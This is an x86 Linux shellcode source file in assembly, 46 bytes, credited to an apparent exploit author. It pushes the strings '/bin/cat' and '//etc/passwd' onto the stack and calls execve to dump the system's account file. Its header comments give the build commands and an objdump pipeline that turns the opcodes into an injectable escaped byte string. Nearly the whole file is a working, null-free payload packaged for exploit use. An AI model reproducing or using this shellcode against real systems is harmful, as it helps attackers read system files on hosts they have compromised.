; execve x86 /bin/cat /etc/passwd - 46 bytes   by 0bfxgh0st*
;
; nasm -f elf execve_x86_cat_etc_passwd.asm
; ld -o execve_x86_cat_etc_passwd execve_x86_cat_etc_passwd.o -m elf_i386
; objdump -d execve_x86_cat_etc_passwd |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
section .text

global _start

_start:

xor eax,eax
xor ecx,ecx
xor edx,edx

push eax           ; push null eax register to the stack
push 0x7461632f    ; push tac/
push 0x6e69622f    ; push nib/
mov ebx,esp        ; move pointer to command into ebx

push eax           ; push null eax register to the stack
push 0x64777373    ; push dwss
push 0x61702f63    ; push ap/c
push 0x74652f2f    ; push te//
mov esi,esp        ; move stack pointer to esi

push eax           ; push null eax register to the stack
push esi           ; push address of the argument to the stack
push ebx           ; push address of the command to the stack
mov ecx,esp        ; move pointer to start of the command to eax

mov al,11
int 0x80

